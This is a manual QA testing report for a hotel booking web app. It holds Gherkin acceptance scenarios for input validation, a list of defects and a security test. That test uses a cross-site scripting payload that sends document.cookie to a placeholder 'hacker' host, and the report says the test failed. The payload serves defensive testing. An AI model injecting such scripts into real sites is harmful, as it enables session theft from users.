## Manual Testing Report

This report has the functional test results on hotel booking system.

## Test Scenarios : All the Acceptance Tests are written based on the below assumptions
```
1. Error messages are displayed when invalid details are provided (e.g : firstname, surename, price and deposit, checkin date and checkout date)
2. Error messages are displayed when checkout date is lesser than the checkin date or this scenario should not be allowed.
3. Success message is displayed when a booking is saved successfully.
4. Success message is displayed when a booking is deleted successfully.
5. Bookings canot be saved for past dates and only saved for future dates.
6. Firstname and Surename fields only allow Alphabets(A-Z or a-z). Numeric or special characters are allowed.
7. Deposit field only allows numeric characters(0-9). Alphabets are nort allowed.
8. Checkin and checkout dates only allows vaild date format.
```

@ManualTests
Feature : Hotel Booking System

  As a customer
  I want to use the book hotel reservation system
  So that I can book my hotel reservations

  ## Test Scenarios coverage for both positive and negative cases.

  ### Positive Cases
  ```bash
  User successfully saves booking reference
  User successfully deletes a saved booking reference
  ```

  ### Negative Cases
  ```bash
  User should be displayed with error message if invalid first name are provided and the booking should not be saved
  User should be displayed with error message if invalid Sure name are provided and the booking should not be saved
  User should be displayed with error message if invalid price are provided and the booking should not be saved
  User should not be able to save booking on past dates
  User should not be able to save checkout date lesser than checkin date
  ```

  ### Defects found based on the testing done :
  ```bash
   1. A user was not able to edit the created booking.
   2. An error message was not displayed when the user tries to create a booking by providing invalid first name, surname, price and deposit amount.
   3. An error message was not displayed when a user tries to create a booking by providing invalid check-in and check-out dates.
   4. An error message was not displayed when a user tries to create a booking with check-out date prior to the check-in date
   5. An error message was not displayed when a user tries to create a booking with special character in the first name and surname fields.
  ```

### Acceptance Tests :
```bash
  Scenario Outline: User successfully saves booking reservation.
  Given I entered the valid details : <first_name>, <sure_name>, <price>, <deposit>, <checkin_date>, <checkout_date>
  When I clciked Save button
  Then the booking should be saved
  And success message is displayed
  And saved booking should be displayed : <first_name>, <sure_name>, <price>, <deposit>, <checkin_date>, <checkout_date>
  Examples:
  | first_name | sure_name | price |deposit | checkin_date  | checkout_date   |
  | Jack       | Jones     | 500   | true   |  2018-06-20   |   2018-06-20    |
  | Jimmy      | Bill      | 460   | false  |  2018-06-27   |   2018-07-05    |
```
```bash
  Scenario Outline: User successfully deletes a saved booking reservation.
  Given I entered the valid details : <first_name>, <sure_name>, <price>, <deposit>, <checkin_date>, <checkout_date>
  And I saved the booking
  When I clciked delete button
  Then the saved booking should be deleted
  And success message is displayed
  Examples:
    | first_name | sure_name | price |deposit | checkin_date | checkout_date  |
    | Jack       | Jones     | 500   | true   |  20          |  25            |
    | Jimmy      | Bill      | 460   | false  |  25          |  28            |
```
```bash
  Scenario Outline: User should be displayed with error message if invalid first name are provided and the booking should not be saved
  Given I entered the invalid details : <first_name>, <sure_name>, <price>, <deposit>
  When I clciked Save button
  Then the booking should not be saved
  And should be display <error_message>
  Examples:
  | first_name      | sure_name      | price |deposit | error_message                    |
  | 12345867!"£$%"  | Jones          | 500   | true   | Please enter a vaild First Name  |
  | Ji543^&         | Jones          | 460   | false  | Please enter a vaild First Name  |
  | null            | Jones          | 460   | false  | Please enter a vaild First Name  |
  |                 | Jones          | 460   | false  | Please enter a vaild First Name  |
```
```bash
  Scenario Outline: User should be displayed with error message if invalid Surname are provided and the booking should not be saved
  Given I entered the invalid details : <first_name>, <sure_name>, <price>, <deposit>
  When I clciked Save button
  Then the booking should not be saved
  And should be display <error_message>
  Examples:
  | first_name    | sure_name        | price |deposit | error_message                    |
  | Jack          | 12345867!"£$%"   | 500   | true   | Please enter a vaild Sure Name   |
  | Jack          | 1234567          | 460   | false  | Please enter a vaild Sure Name   |
  | Jack          | 1234^&*          | 460   | false  | Please enter a vaild Sure Name   |
  | Jack          | null             | 460   | false  | Please enter a vaild Sure Name   |
```
```bash
  Scenario Outline: User should be displayed with error message if invalid price are provided and the booking should not be saved
  Given I entered the invalid details : <first_name>, <sure_name>, <price>, <deposit>
  When I clciked Save button
  Then the booking should not be saved
  And should be display <error_message>
  Examples:
  | first_name | sure_name  | price        |deposit | error_message               |
  | Jack       | Jones      | 50dfgh"££0"  | true   | Please enter a vaild price  |
```
```bash
  Scenario: User should not be able to save booking on past dates
  Given I entered the invalid details : <first_name>, <sure_name>, <price>, <deposit>, <checkin_dtae>, <checkout_dtae>
  When I clciked Save button
  Then the booking should not be saved
  And checkin date <checkin_error_message> should be display
  And checkin date <error_message> should be display
  Examples:
  | first_name | sure_name | price |deposit | checkin_date  | checkout_date   | error_message                       |
  | Jack       | Jones     | 500   | true   |  2018-06-20   |   2018-06-20    | Please enter a vaild checkin date   |
  | Jimmy      | Bill      | 460   | false  |  2018-06-27   |   2018-07-05    | Please enter a vaild checkin date   |
```
```bash
  Scenario: User should not be able to save checkout date lesser than checkin date
    Given I entered the invalid details : <first_name>, <sure_name>, <price>, <deposit>, <checkin_dtae>, <checkout_dtae>
    When I clciked Save button
    Then the booking should not be saved
    And checkin date <checkin_error_message> should be display
    And checkin date <error_message> should be display
  Examples:
  | first_name | sure_name | price |deposit | checkin_date  | checkout_date   | error_message                                           |
  | Jack       | Jones     | 500   | true   |  2018-06-20   |   2018-06-12    | Checkout date should be greater than the checkin date   |

```

  ## Security Cases
  User should not be able to save the booking (Security testing)

### Below are the findings of security testing :
```bash
  Scenario Outline: User should not be able to save the booking (Security testing)
    Given I entered the in-valid details : <first_name>, <sure_name>, <price>, <deposit>, <checkin_date>, <checkout_date>
    | first_name                                                                             | sure_name                                                                              | price |deposit | checkin_date  | checkout_date   |
    | <SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>   | <SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>   | 500   | true   |  2018-06-20   |   2018-06-20    |
    When I clciked Save button
    Then the booking should not be saved
```

### Report : Security test Failed

 ![alt text](https://user-images.githubusercontent.com/36641942/74157644-88692000-4c10-11ea-9bad-a497cdd94bde.PNG)
